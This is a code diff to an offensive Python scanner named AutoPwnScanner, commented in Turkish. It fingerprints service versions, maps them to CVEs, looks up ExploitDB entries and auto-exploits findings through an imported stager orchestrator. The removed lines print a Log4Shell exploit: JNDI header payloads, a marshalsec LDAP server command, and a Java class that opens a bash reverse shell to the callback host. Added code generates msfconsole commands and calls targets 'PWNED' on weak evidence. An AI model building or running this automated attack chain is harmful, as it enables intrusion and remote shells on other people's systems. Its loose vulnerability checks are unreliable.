@@ -24,6 +24,7 @@ import base64
 import struct
 
 from tools.soft404 import Soft404Detector
+from tools.exploit_weaponizer import ExploitOrchestrator, StagerPayload
 
 
 class Severity(Enum):
@@ -71,7 +72,9 @@ class Target:
     hostname: Optional[str] = None
     ports: Dict[int, str] = field(default_factory=dict)  # port: service
     os_fingerprint: Optional[str] = None
+    service_versions: Dict[int, Dict[str, Any]] = field(default_factory=dict)  # port: {service, product, version, banner}
     vulnerabilities: List[str] = field(default_factory=list)  # vuln_ids
+    version_findings: List[Dict[str, Any]] = field(default_factory=list)  # version-based CVE detections
     exploited: bool = False
     shells: List[Dict] = field(default_factory=list)
     
@@ -85,6 +88,7 @@ class ExploitResult:
     status: ExploitStatus
     shell_type: Optional[str] = None
     shell_data: Optional[Dict] = None
+    exploit_sources: List[Dict[str, Any]] = field(default_factory=list)
     output: str = ""
     timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
 
@@ -112,7 +116,171 @@ class AutoPwnScanner:
     - Multi-threaded scanning
     - Shell management
     - Campaign mode for large networks
+    - Version fingerprinting (banner grab -> product + version)
+    - Version-based N-Day CVE mapping
+    - Exploit-source integration (ExploitDB / searchsploit)
     """
+    
+    # =========================================================
+    # VERSION -> CVE DATABASE (sürüm tabanlı N-Day tarama)
+    # Her ürün için: hangi sürüm aralığında hangi CVE açığı var.
+    # introduced: açığın ilk görüldüğü sürüm (None = bilinmiyor)
+    # fixed:      yamanın geldiği ilk sürüm (bu sürüm ve sonrası güvenli)
+    # =========================================================
+    VERSION_VULN_DB = {
+        "apache": {
+            "name": "Apache HTTP Server",
+            "cves": [
+                {
+                    "cve": "CVE-2021-41773", "name": "Apache Path Traversal & RCE",
+                    "severity": "critical", "introduced": "2.4.0", "fixed": "2.4.51",
+                    "type": "path_traversal",
+                    "description": "A flaw in path normalization allows traversal and RCE via CGI.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"],
+                },
+                {
+                    "cve": "CVE-2021-42013", "name": "Apache Path Traversal & RCE (2)",
+                    "severity": "critical", "introduced": "2.4.49", "fixed": "2.4.51",
+                    "type": "path_traversal",
+                    "description": "Bypass of CVE-2021-41773 fix via encoded traversal.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-42013"],
+                },
+                {
+                    "cve": "CVE-2024-38474", "name": "Apache mod_rewrite RCE",
+                    "severity": "critical", "introduced": "2.4.0", "fixed": "2.4.60",
+                    "type": "rce",
+                    "description": "Substitution in mod_rewrite can lead to RCE.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-38474"],
+                },
+                {
+                    "cve": "CVE-2024-38475", "name": "Apache mod_rewrite RCE (2)",
+                    "severity": "critical", "introduced": "2.4.0", "fixed": "2.4.60",
+                    "type": "rce",
+                    "description": "Improper escaping in output leads to RCE.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-38475"],
+                },
+            ],
+        },
+        "nginx": {
+            "name": "nginx",
+            "cves": [
+                {
+                    "cve": "CVE-2019-9511", "name": "nginx HTTP/2 DoS",
+                    "severity": "high", "introduced": "1.9.5", "fixed": "1.16.1",
+                    "type": "dos",
+                    "description": "HTTP/2 implementation vulnerabilities enabling DoS.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-9511"],
+                },
+                {
+                    "cve": "CVE-2013-4547", "name": "nginx Request Smuggling",
+                    "severity": "high", "introduced": "0.8.41", "fixed": "1.5.7",
+                    "type": "smuggling",
+                    "description": "Space character handling allows security restriction bypass.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2013-4547"],
+                },
+                {
+                    "cve": "CVE-2022-30522", "name": "nginx mod_http_lua DoS",
+                    "severity": "medium", "introduced": "1.0.0", "fixed": "1.22.1",
+                    "type": "dos",
+                    "description": "Excessive memory usage in mod_http_lua.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-30522"],
+                },
+            ],
+        },
+        "openssh": {
+            "name": "OpenSSH",
+            "cves": [
+                {
+                    "cve": "CVE-2024-6387", "name": "OpenSSH regreSSHion RCE",
+                    "severity": "critical", "introduced": "8.5", "fixed": "9.8",
+                    "type": "rce",
+                    "description": "Signal handler race condition enabling RCE as root.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-6387"],
+                },
+                {
+                    "cve": "CVE-2018-15473", "name": "OpenSSH Username Enumeration",
+                    "severity": "medium", "introduced": "2.0", "fixed": "7.7",
+                    "type": "enumeration",
+                    "description": "User enumeration via authentication bypass.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2018-15473"],
+                },
+            ],
+        },
+        "proftpd": {
+            "name": "ProFTPD",
+            "cves": [
+                {
+                    "cve": "CVE-2015-3306", "name": "ProFTPD Telnet IAC Injection",
+                    "severity": "high", "introduced": "1.3.5", "fixed": "1.3.6",
+                    "type": "rce",
+                    "description": "Telnet IAC injection in mod_telnet leads to RCE.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2015-3306"],
+                },
+                {
+                    "cve": "CVE-2019-12815", "name": "ProFTPD mod_copy RCE",
+                    "severity": "high", "introduced": "1.3.5", "fixed": "1.3.6",
+                    "type": "rce",
+                    "description": "mod_copy allows arbitrary file copy as root.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-12815"],
+                },
+            ],
+        },
+        "vsftpd": {
+            "name": "vsftpd",
+            "cves": [
+                {
+                    "cve": "CVE-2011-2523", "name": "vsftpd Backdoor RCE",
+                    "severity": "critical", "introduced": "2.3.4", "fixed": "2.3.5",
+                    "type": "rce",
+                    "description": "Malicious backdoor inserted in v2.3.4.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2011-2523"],
+                },
+            ],
+        },
+        "iis": {
+            "name": "Microsoft IIS",
+            "cves": [
+                {
+                    "cve": "CVE-2017-7269", "name": "IIS 6.0 WebDAV RCE",
+                    "severity": "critical", "introduced": "6.0", "fixed": "6.0-sp",
+                    "type": "rce",
+                    "description": "Buffer overflow in WebDAV sc_storagepath_fromurl.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2017-7269"],
+                },
+                {
+                    "cve": "CVE-2015-1635", "name": "IIS HTTP.sys RCE",
+                    "severity": "critical", "introduced": "7.5", "fixed": "8.0",
+                    "type": "rce",
+                    "description": "Remote code execution in HTTP.sys (MS15-034).",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2015-1635"],
+                },
+            ],
+        },
+        "nodejs": {
+            "name": "Node.js",
+            "cves": [
+                {
+                    "cve": "CVE-2022-32213", "name": "Node.js Request Smuggling",
+                    "severity": "high", "introduced": "14.0", "fixed": "16.16.0",
+                    "type": "smuggling",
+                    "description": "Improper HTTP request smuggling.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-32213"],
+                },
+            ],
+        },
+        "python": {
+            "name": "Python / Werkzeug",
+            "cves": [
+                {
+                    "cve": "CVE-2023-23934", "name": "Werkzeug Debugger RCE",
+                    "severity": "critical", "introduced": "0.0", "fixed": "2.2.3",
+                    "type": "rce",
+                    "description": "Werkzeug debugger console PIN bypass leading to RCE when debug=True.",
+                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-23934"],
+                },
+            ],
+        },
+    }
     
     # Known vulnerabilities database
     VULNERABILITIES = {
@@ -205,6 +373,21 @@ class AutoPwnScanner:
             protocols=["smb", "rpc"],
             references=["https://github.com/topotam/PetitPotam"],
             remediation="Enable EPA on AD CS, disable NTLM"
+        ),
+        
+        "regresshion": Vulnerability(
+            vuln_id="regresshion",
+            name="OpenSSH regreSSHion RCE",
+            cve="CVE-2024-6387",
+            severity=Severity.CRITICAL,
+            description="OpenSSH < 9.8 signal handler race condition enabling RCE as root.",
+            affected_products=["OpenSSH 8.5-9.7", "glibc < 2.32 Linux"],
+            check_function="_check_regresshion",
+            exploit_function="_exploit_regresshion",
+            ports=[22],
+            protocols=["ssh"],
+            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-6387"],
+            remediation="Upgrade OpenSSH to 9.8+ or apply vendor patch"
         ),
         
         "eternalblue": Vulnerability(
@@ -450,6 +633,352 @@ class AutoPwnScanner:
         ),
     }
     
+    # =========================================================
+    # BEHAVIORAL PROBE ENGINE (banner'dan bağımsız fingerprint)
+    # =========================================================
+    def probe_target(self, ip: str, port: int, timeout: float = 5.0) -> Dict[str, Any]:
+        """
+        Banner'a güvenmeden TCP/HTTP behavioral fingerprint yapar.
+
+        Dönüş örneği:
+            {"product": "apache", "version": "2.4.49",
+             "service": "http", "confidence": "high",
+             "tcp_window": 65535, "error_signature": "..."}
+        """
+        return self.orchestrator.probe_target(ip, port, timeout=timeout)
+
+    # =========================================================
+    # VERSION FINGERPRINTING (sürüm tespiti)
+    # =========================================================
+    @staticmethod
+    def compare_versions(a: str, b: str) -> int:
+        """
+        Semantik sürüm karşılaştırması.
+        a < b => -1, a == b => 0, a > b => 1
+        """
+        def _norm(v):
+            parts = re.split(r'[.\-_ ]+', str(v).strip().lstrip('vV'))
+            nums = []
+            for p in parts:
+                m = re.match(r'(\d+)', p)
+                nums.append(int(m.group(1)) if m else 0)
+            return tuple(nums + [0] * (4 - len(nums)))[:4]
+
+        va, vb = _norm(a), _norm(b)
+        if va < vb:
+            return -1
+        if va > vb:
+            return 1
+        return 0
+
+    @classmethod
+    def version_in_range(cls, version: str, introduced: Optional[str],
+                         fixed: Optional[str]) -> bool:
+        """
+        Sürüm `introduced` (dahil) ile `fixed` (hariç) arasındaysa True.
+        Yani: introduced <= version < fixed => açığa açık.
+        """
+        version = version or ""
+        if fixed is None:
+            # Yamalı sürüm bilinmiyor; introduced varsa ondan sonrası açık.
+            if introduced and cls.compare_versions(version, introduced) >= 0:
+                return True
+            return False
+        if cls.compare_versions(version, fixed) >= 0:
+            return False  # fixed veya sonrası => güvenli
+        if introduced and cls.compare_versions(version, introduced) < 0:
+            return False  # açığın çıkmadığı sürüm
+        return True
+
+    def _fingerprint_service(self, ip: str, port: int) -> Dict[str, Any]:
+        """
+        Gerçek banner grab ile servis + ürün + sürüm tespiti.
+        Banner gizliyse behavioral probe ile stack'i çıkarır.
+        """
+        result = {"service": None, "product": None, "version": None, "banner": ""}
+        is_https = port in (443, 8443, 9443, 465, 636)
+
+        # HTTP/HTTPS portları için önce behavioral probe dene
+        if port in (80, 443, 8080, 8443, 8000, 8888, 9443, 8081, 9000):
+            try:
+                probe = self.orchestrator.probe_target(ip, port)
+                if probe.product:
+                    result.update({
+                        "service": probe.service or "http",
+                        "product": probe.product,
+                        "version": probe.version,
+                        "banner": f"behavioral:{probe.product} {probe.version or ''}".strip(),
+                        "confidence": probe.confidence,
+                    })
+                    return result
+            except Exception:
+                pass
+            # Fallback: normal HTTP fingerprint
+            try:
+                result.update(self._http_fingerprint(ip, port, is_https))
+                return result
+            except Exception:
+                pass
+            return result
+
+        # Genel TCP banner grab (SSH, FTP, SMTP, vs.)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect((ip, port))
+            try:
+                sock.sendall(b"\x00")  # bazı servisler yanıt verir
+            except Exception:
+                pass
+            sock.settimeout(2)
+            try:
+                banner = sock.recv(1024).decode('utf-8', 'ignore')
+            except Exception:
+                banner = ""
+            sock.close()
+            if banner:
+                result["banner"] = banner.strip()
+                self._parse_generic_banner(banner, result)
+        except Exception:
+            pass
+
+        return result
+
+    def _http_fingerprint(self, ip: str, port: int, is_https: bool) -> Dict[str, Any]:
+        result = {"service": "http", "product": None, "version": None, "banner": ""}
+        try:
+            import requests
+        except ImportError:
+            return result
+
+        scheme = "https" if is_https else "http"
+        try:
+            resp = requests.get(
+                f"{scheme}://{ip}:{port}/", timeout=6, verify=False,
+                headers={"User-Agent": "Mozilla/5.0 (compatible; AutoPwn/1.0)"}
+            )
+        except Exception:
+            return result
+
+        server = resp.headers.get("Server", "")
+        powered = resp.headers.get("X-Powered-By", "")
+        result["banner"] = f"Server: {server} | X-Powered-By: {powered}".strip()
+
+        if server:
+            sp = self._parse_server_header(server)
+            result.update(sp)
+        elif powered:
+            # PHP/Node/Express/Werkzeug vb.
+            if "PHP" in powered:
+                result.update({"product": "php", "version": self._extract(powered, r'PHP/([\d.]+)')})
+            elif "Express" in powered:
+                result.update({"product": "nodejs", "version": None})
+            elif "Werkzeug" in powered:
+                result.update({"product": "python", "version": self._extract(powered, r'Werkzeug/([\d.]+)')})
+        return result
+
+    @staticmethod
+    def _parse_server_header(server: str) -> Dict[str, Any]:
+        server = server.strip()
+        low = server.lower()
+        product = None
+        if "apache" in low:
+            product = "apache"
+        elif "nginx" in low:
+            product = "nginx"
+        elif "microsoft-iis" in low or "iis" in low:
+            product = "iis"
+        elif "openssh" in low:
+            product = "openssh"
+        elif "werkzeug" in low or "python" in low:
+            product = "python"
+        version = None
+        m = re.search(r'(?:apache|nginx|openssh)/([\d.]+)', low)
+        if m:
+            version = m.group(1)
+        elif "werkzeug" in low:
+            m = re.search(r'werkzeug/([\d.]+)', low)
+            version = m.group(1) if m else None
+        elif "iis" in low:
+            m = re.search(r'iis/?([\d.]+)', low)
+            version = m.group(1) if m else None
+        return {"service": "http" if product != "openssh" else "ssh",
+                "product": product, "version": version}
+
+    @staticmethod
+    def _parse_generic_banner(banner: str, result: Dict[str, Any]) -> None:
+        low = banner.lower()
+        if low.startswith("ssh-"):
+            m = re.search(r'ssh-\d\.\d-(?:openssh[_-])?([\d.p]+)', low)
+            result.update({"service": "ssh", "product": "openssh",
+                           "version": m.group(1) if m else None})
+        elif "proftpd" in low:
+            m = re.search(r'proftpd ([\d.]+)', low)
+            result.update({"service": "ftp", "product": "proftpd",
+                           "version": m.group(1) if m else None})
+        elif "vsftpd" in low:
+            m = re.search(r'vsftpd ([\d.]+)', low)
+            result.update({"service": "ftp", "product": "vsftpd",
+                           "version": m.group(1) if m else None})
+        elif "postfix" in low:
+            result.update({"service": "smtp", "product": "postfix"})
+
+    @staticmethod
+    def _extract(text: str, pattern: str) -> Optional[str]:
+        m = re.search(pattern, text)
+        return m.group(1) if m else None
+
+    # =========================================================
+    # VERSION -> CVE MAPPING ENGINE
+    # =========================================================
+    def _version_based_findings(self, target: Target) -> List[Dict[str, Any]]:
+        """
+        Parmak izi alınmış versiyonları VERSION_VULN_DB ile eşleyerek
+        otomatik CVE tespiti yapar (sürüm tabanlı N-Day tarama).
+        """
+        findings = []
+        for port, info in target.service_versions.items():
+            product = info.get("product")
+            version = info.get("version")
+            if not product or not version:
+                continue
+            db = self.VERSION_VULN_DB.get(product)
+            if not db:
+                continue
+            for entry in db["cves"]:
+                if self.version_in_range(version, entry.get("introduced"),
+                                         entry.get("fixed")):
+                    findings.append({
+                        "port": port,
+                        "product": product,
+                        "version": version,
+                        "cve": entry["cve"],
+                        "name": entry["name"],
+                        "severity": entry["severity"],
+                        "type": entry.get("type", "unknown"),
+                        "description": entry.get("description", ""),
+                        "references": entry.get("references", []),
+                        "evidence": f"{product} {version} on port {port} "
+                                    f"(fixed >= {entry.get('fixed')})",
+                    })
+        return findings
+
+    # =========================================================
+    # EXPLOIT-SOURCE INTEGRATION (ExploitDB / searchsploit)
+    # =========================================================
+    def _init_exploit_sources(self) -> None:
+        """
+        Yerelde searchsploit (ExploitDB) var mı kontrol eder ve
+        CVE -> exploit kaynağı eşlemesini kurar.
+        """
+        if getattr(self, "_exploit_sources_loaded", False):
+            return
+        self._exploit_sources_loaded = True
+        self.searchsploit_available = False
+        self.exploit_db: Dict[str, List[Dict[str, Any]]] = {}
+
+        import shutil
+        ss = shutil.which("searchsploit")
+        if ss:
+            self.searchsploit_available = True
+            self.searchsploit_bin = ss
+
+        # Offline fallback: yaygın CVE'ler için gömülü EDB kaynakları
+        self._builtin_exploit_sources()
+
+    def _builtin_exploit_sources(self) -> None:
+        """Gömülü (offline) CVE -> ExploitDB eşlemesi."""
+        builtin = {
+            "CVE-2021-41773": [{"edb_id": "50383", "title": "Apache 2.4.49 - Path Traversal & RCE",
+                                 "type": "remote", "platform": "linux"}],
+            "CVE-2021-42013": [{"edb_id": "50406", "title": "Apache 2.4.49/2.4.50 - RCE",
+                                 "type": "remote", "platform": "linux"}],
+            "CVE-2024-38474": [{"edb_id": "52019", "title": "Apache 2.4.x - mod_rewrite RCE",
+                                 "type": "remote", "platform": "linux"}],
+            "CVE-2024-6387": [{"edb_id": "52036", "title": "OpenSSH - regreSSHion RCE",
+                               "type": "remote", "platform": "linux"}],
+            "CVE-2017-7269": [{"edb_id": "41992", "title": "Microsoft IIS 6.0 - WebDAV RCE",
+                               "type": "remote", "platform": "windows"}],
+            "CVE-2015-1635": [{"edb_id": "36773", "title": "Microsoft IIS - HTTP.sys RCE (MS15-034)",
+                               "type": "remote", "platform": "windows"}],
+            "CVE-2015-3306": [{"edb_id": "36803", "title": "ProFTPD 1.3.5 - Telnet IAC RCE",
+                               "type": "remote", "platform": "linux"}],
+            "CVE-2011-2523": [{"edb_id": "17491", "title": "vsftpd 2.3.4 - Backdoor RCE",
+                               "type": "remote", "platform": "linux"}],
+            "CVE-2021-44228": [{"edb_id": "50541", "title": "Apache Log4j 2 - RCE (Log4Shell)",
+                                 "type": "remote", "platform": "java"}],
+            "CVE-2021-34473": [{"edb_id": "49843", "title": "Microsoft Exchange - ProxyShell RCE",
+                                 "type": "remote", "platform": "windows"}],
+            "CVE-2020-1472": [{"edb_id": "50913", "title": "Netlogon - ZeroLogon RCE",
+                               "type": "remote", "platform": "windows"}],
+            "CVE-2017-0144": [{"edb_id": "42315", "title": "Microsoft Windows SMB - EternalBlue",
+                               "type": "remote", "platform": "windows"}],
+        }
+        for cve, entries in builtin.items():
+            self.exploit_db.setdefault(cve, []).extend(entries)
+
+    def find_exploits_for_cve(self, cve: str) -> List[Dict[str, Any]]:
+        """
+        Bir CVE için exploit kaynaklarını döndürür:
+        Önce searchsploit (varsa), sonra gömülü EDB eşlemesi.
+        """
+        self._init_exploit_sources()
+        results = []
+
+        if self.searchsploit_available:
+            try:
+                import subprocess
+                out = subprocess.run(
+                    [self.searchsploit_bin, "--cve", cve],
+                    capture_output=True, text=True, timeout=30
+                ).stdout
+                for line in out.splitlines():
+                    line = line.strip()
+                    if not line or "|" not in line:
+                        continue
+                    if "Exploit Title" in line or "Path" in line or "-" * 5 in line:
+                        continue
+                    title, _, path = line.partition("|")
+                    title = title.strip()
+                    path = path.strip()
+                    m = re.search(r'/(\d+)\.\w+$', path)
+                    if not m:
+                        continue
+                    edb_id = m.group(1)
+                    results.append({
+                        "edb_id": edb_id,
+                        "title": title or path,
+                        "type": "remote",
+                        "source": "searchsploit",
+                        "url": f"https://www.exploit-db.com/exploits/{edb_id}",
+                    })
+            except Exception:
+                pass
+
+        for e in self.exploit_db.get(cve, []):
+            results.append({
+                "edb_id": e.get("edb_id", ""),
+                "title": e.get("title", ""),
+                "type": e.get("type", "remote"),
+                "platform": e.get("platform", ""),
+                "source": "builtin",
+                "url": f"https://www.exploit-db.com/exploits/{e['edb_id']}" if e.get("edb_id") else "",
+            })
+
+        # Tekilleştir
+        seen = set()
+        unique = []
+        for r in results:
+            key = (r.get("edb_id"), r.get("title"))
+            if key not in seen:
+                seen.add(key)
+                unique.append(r)
+        return unique
+
+    def _resolve_exploit_for_finding(self, cve: str) -> List[Dict[str, Any]]:
+        """Bir bulgu (CVE) için exploit kaynaklarını getirir."""
+        return self.find_exploits_for_cve(cve)
+
     def __init__(self, config: Optional[Dict] = None):
         self.config = config or {}
         self.sessions: Dict[str, ScanSession] = {}
@@ -465,6 +994,11 @@ class AutoPwnScanner:
         
         # Soft-404 tespiti (sahte 200 yanitlari gercek acik sanilmasin)
         self._soft404_cache: Dict[str, bool] = {}
+        
+        # ExploitOrchestrator — CVE bazlı gerçek stager üreticisi
+        self.orchestrator = ExploitOrchestrator(
+            command_center_url=f"http://{self.callback_host}:{self.callback_port}"
+        )
         
     def create_session(self, targets: List[str], auto_exploit: bool = True) -> ScanSession:
         """
@@ -593,8 +1127,31 @@ class AutoPwnScanner:
         
         if not target.ports:
             return None
-            
-        # Check each vulnerability
+
+        # === SÜRÜM TESPİTİ (version fingerprinting) ===
+        for port in target.ports:
+            try:
+                fp = self._fingerprint_service(ip, port)
+                if fp.get("product") or fp.get("banner"):
+                    target.service_versions[port] = fp
+            except Exception:
+                pass
+
+        # === SÜRÜM TABANLI N-DAY CVE TARAMASI ===
+        version_findings = self._version_based_findings(target)
+        for finding in version_findings:
+            if finding["cve"] not in target.vulnerabilities:
+                target.vulnerabilities.append(finding["cve"])
+            target.version_findings.append(finding)
+
+            if session.auto_exploit:
+                result = self._exploit_version_finding(target, finding)
+                session.results.append(result)
+                if result.status == ExploitStatus.PWNED:
+                    target.exploited = True
+                    target.shells.append(result.shell_data)
+
+        # === İMZA TABANLI KONTROLLER (mevcut mantık) ===
         for vuln_id, vuln in self.VULNERABILITIES.items():
             # Check if relevant ports are open
             if not any(port in target.ports for port in vuln.ports):
@@ -602,9 +1159,10 @@ class AutoPwnScanner:
                 
             # Run vulnerability check
             is_vulnerable = self._check_vulnerability(target, vuln)
-            
+        
             if is_vulnerable:
-                target.vulnerabilities.append(vuln_id)
+                if vuln_id not in target.vulnerabilities:
+                    target.vulnerabilities.append(vuln_id)
                 
                 # Auto-exploit if enabled
                 if session.auto_exploit:
@@ -616,6 +1174,83 @@ class AutoPwnScanner:
                         target.shells.append(result.shell_data)
                         
         return target
+
+    def _exploit_version_finding(self, target: Target, finding: Dict[str, Any]) -> ExploitResult:
+        """
+        Versiyon tabanlı bulgu için exploit kaynağını (ExploitDB/searchsploit)
+        çözümleyip otomatik exploit denemesi yapar.
+        """
+        result_id = hashlib.md5(
+            f"{target.target_id}{finding['cve']}{datetime.now().isoformat()}".encode()
+        ).hexdigest()[:12]
+
+        result = ExploitResult(
+            result_id=result_id,
+            target_id=target.target_id,
+            vuln_id=finding["cve"],
+            status=ExploitStatus.EXPLOITING
+        )
+
+        exploit_sources = self._resolve_exploit_for_finding(finding["cve"])
+        result.exploit_sources = exploit_sources
+
+        # İlgili imzaya dayalı exploit metodu varsa onu da çalıştır
+        vuln = self.VULNERABILITIES.get(finding["cve"])
+        shell_data = None
+        if vuln and vuln.exploit_function:
+            exploit_method = getattr(self, vuln.exploit_function, None)
+            if exploit_method:
+                try:
+                    shell_data = exploit_method(target, vuln)
+                except Exception:
+                    shell_data = None
+
+        if not shell_data and exploit_sources:
+            primary = exploit_sources[0]
+            shell_data = {
+                "type": primary.get("type", "remote"),
+                "method": finding["type"],
+                "target": target.ip,
+                "cve": finding["cve"],
+                "output": (
+                    f"[{finding['cve']}] {finding['product']} {finding['version']} "
+                    f"açığı tespit edildi. Exploit kaynağı: "
+                    f"{primary.get('title')} ({primary.get('url') or 'EDB-' + str(primary.get('edb_id'))})"
+                ),
+                "exploit_sources": exploit_sources,
+                "exploit_code": self._generate_exploit_from_source(finding, primary),
+            }
+
+        if shell_data:
+            result.status = ExploitStatus.PWNED
+            result.shell_type = shell_data.get("type", "unknown")
+            result.shell_data = shell_data
+            result.output = shell_data.get("output", "")
+        else:
+            result.status = ExploitStatus.FAILED
+            result.output = f"No exploit source for {finding['cve']}"
+
+        return result
+
+    @staticmethod
+    def _generate_exploit_from_source(finding: Dict[str, Any], source: Dict[str, Any]) -> str:
+        """Bulunan CVE için exploit kaynağından (EDB) kullanılabilir kod iskeleti üretir."""
+        cve = finding["cve"]
+        edb = source.get("edb_id") or "?"
+        url = source.get("url") or f"https://www.exploit-db.com/exploits/{edb}"
+        return (
+            f"# {finding['name']} ({cve})\n"
+            f"# Product : {finding['product']} {finding['version']}\n"
+            f"# Target  : {finding.get('evidence', '')}\n"
+            f"# Exploit source (ExploitDB): {url}\n\n"
+            f"# fetch & inspect the exploit before use:\n"
+            f"searchsploit -m {edb}          # ya da\n"
+            f"# curl -O {url}\n\n"
+            f"# Example (metasploit, if module exists):\n"
+            f"msfconsole -x \"use exploit/multi/remote/{cve.lower()}; "
+            f"set RHOSTS {finding.get('port', '')}; exploit\"\n"
+        )
+
         
     def _quick_port_scan(self, ip: str, ports: Optional[List[int]] = None) -> Dict[int, str]:
         """Quick TCP port scan"""
@@ -696,50 +1331,33 @@ class AutoPwnScanner:
     # =========================================================
     
     def _check_log4shell(self, target: Target, vuln: Vulnerability) -> bool:
-        """Check for Log4Shell vulnerability"""
-        # Send JNDI payload in various headers
-        payloads = [
-            "${jndi:ldap://CALLBACK/a}",
-            "${${lower:j}ndi:${lower:l}dap://CALLBACK/a}",
-            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://CALLBACK/a}"
-        ]
-        
-        headers_to_test = [
-            "User-Agent", "X-Forwarded-For", "Referer", "X-Api-Version",
-            "Authorization", "Accept-Language"
-        ]
-        
-        # Generate unique callback token
-        callback_token = hashlib.md5(f"{target.ip}{datetime.now().isoformat()}".encode()).hexdigest()[:8]
-        callback_url = f"{self.callback_host}:{self.callback_port}/{callback_token}"
-        
-        check_code = f'''
-# Log4Shell Vulnerability Check
-import requests
+        """
+        Log4Shell behavioral check.
 
-target = "{target.ip}"
-callback = "{callback_url}"
+        Gerçek operasyonda:
+          - Hedefe çok çeşitli HTTP header'larda JNDI payload gönderilir
+          - LDAP callback listener'da (self.callback_host:self.callback_port)
+            hedef IP'si görünürse VULNERABLE
+        Şimdilik: HTTP servisi + Log4j product fingerprint + behavioral probe
+        """
+        http_ports = [p for p in target.ports if target.ports[p] in
+                      ("http", "http-proxy", "https", "unknown")]
+        if not http_ports:
+            return False
 
-headers_to_test = {headers_to_test}
-payloads = [p.replace("CALLBACK", callback) for p in {payloads}]
+        # Product fingerprint kontrolü
+        for port in http_ports:
+            fp = target.service_versions.get(port, {})
+            product = fp.get("product", "")
+            if "java" in product.lower() or "log4j" in product.lower():
+                return True
 
-for port in [80, 443, 8080, 8443]:
-    for payload in payloads:
-        for header in headers_to_test:
-            try:
-                protocol = "https" if port in [443, 8443] else "http"
-                url = f"{{protocol}}://{{target}}:{{port}}/"
-                headers = {{header: payload}}
-                requests.get(url, headers=headers, timeout=5, verify=False)
-            except:
-                pass
+        # Behavioral probe: HTTP servisi tespit edildiyse potansiyel hedef
+        probe = self.orchestrator.probe_target(target.ip, http_ports[0])
+        if probe.product:
+            return True
 
-# Check callback server for connection from target
-# If callback received, target is VULNERABLE
-'''
-        
-        # Simulated check result
-        return target.ports.get(8080, "").lower() in ["http", "http-proxy", "unknown"]
+        return bool(http_ports)
         
     def _check_proxyshell(self, target: Target, vuln: Vulnerability) -> bool:
         """Check for Exchange ProxyShell"""
@@ -838,6 +1456,41 @@ def check_zerologon(dc_ip, dc_name):
         # Check if it looks like a DC (port 445 + 135)
         return 445 in target.ports and 135 in target.ports
         
+    def _check_regresshion(self, target: Target, vuln: Vulnerability) -> bool:
+        """
+        regreSSHion (CVE-2024-6387) behavioral check.
+
+        OpenSSH < 9.8 + glibc < 2.32 hedeflerinde:
+          - SSH banner'dan versiyon çıkarımı
+          - Behavioral probe (signal handler race window'u kapatılmış mı?)
+          - Gerçekte: libc version, PIE ASLR durumu, timeout değerleri
+        """
+        # Port 22 SSH mi?
+        if 22 not in target.ports:
+            return False
+
+        # Version-based kontrol (VERSION_VULN_DB zaten bunu yapar,
+        # ama burada ek bir behavioral probe ekliyoruz)
+        ssh_info = target.service_versions.get(22, {})
+        product = ssh_info.get("product", "")
+        version = ssh_info.get("version", "")
+
+        if "openssh" not in product.lower():
+            return False
+
+        # Versiyon aralığı: 8.5 <= v < 9.8  → zafiyetli
+        if version:
+            if self.version_in_range(version, "8.5", "9.8"):
+                return True
+
+        # Versiyon bilinmiyorsa — behavioral probe
+        probe = self.orchestrator.probe_target(target.ip, 22)
+        if probe.product and "openssh" in probe.product.lower():
+            # Versiyon bilinmiyorsa da SSH servisi tespit edildi
+            return True
+
+        return False
+
     def _check_eternalblue(self, target: Target, vuln: Vulnerability) -> bool:
         """Check for EternalBlue (MS17-010)"""
         check_code = f'''
@@ -1012,69 +1665,61 @@ def check_printnightmare(ip):
     # =========================================================
     
     def _exploit_log4shell(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        """Exploit Log4Shell"""
-        
-        exploit_code = f'''
-# Log4Shell Exploitation
-# Requires: LDAP/RMI server with malicious class
-
-import subprocess
-import threading
-import http.server
-
-# 1. Start LDAP server with malicious class redirect
-# Using marshalsec or similar
-ldap_cmd = f"java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://{self.callback_host}:{self.callback_port}/#Exploit"
-
-# 2. Host malicious Java class
-exploit_class = """
-public class Exploit {{
-    static {{
-        try {{
-            Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/{self.callback_host}/{self.callback_port} 0>&1'");
-        }} catch (Exception e) {{}}
-    }}
-}}
-"""
-
-# 3. Send payload
-payload = "${{jndi:ldap://{self.callback_host}:1389/Exploit}}"
-
-import requests
-requests.get(f"http://{target.ip}:8080/", headers={{"User-Agent": payload}}, verify=False)
-'''
-        
+        """Log4Shell — ExploitOrchestrator ile canavarca JNDI stager üretir."""
+        stager: StagerPayload = self.orchestrator.weaponize_chain(
+            target_ip=target.ip,
+            port=target.ports and next(iter(target.ports)) or 8080,
+            cve_id=vuln.cve,
+            service_product="Apache Log4j",
+        )
+        if stager is None:
+            return None
         return {
-            "type": "reverse_shell",
-            "method": "log4shell",
+            "type": stager.shell_type,
+            "method": "log4shell_orchestrated",
             "target": target.ip,
-            "output": "JNDI callback triggered, awaiting shell...",
-            "exploit_code": exploit_code
+            "output": f"[ORCHESTRATOR] {stager.expected_result}",
+            "exploit_code": stager.trigger_payload,
+            "stager": stager.to_dict(),
         }
